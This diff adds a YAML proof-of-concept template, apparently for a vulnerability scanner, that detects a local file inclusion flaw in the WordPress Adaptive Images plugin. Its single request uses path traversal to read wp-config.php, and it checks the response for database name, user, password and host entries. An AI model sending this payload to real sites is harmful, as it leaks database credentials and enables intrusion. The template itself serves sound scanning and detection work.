@@ -1,0 +1,22 @@
+id: poc-yaml-wordpress-ext-adaptive-images-lfi
+info:
+  name: Wordpress Ext Adaptive Images 本地文件包含漏洞
+  severity: high
+  tags:
+  - lfi
+  finger: WordPress
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "DB_NAME") && contains(body, "DB_USER")
+    && contains(body, "DB_PASSWORD") && contains(body, "DB_HOST")
+  output: []
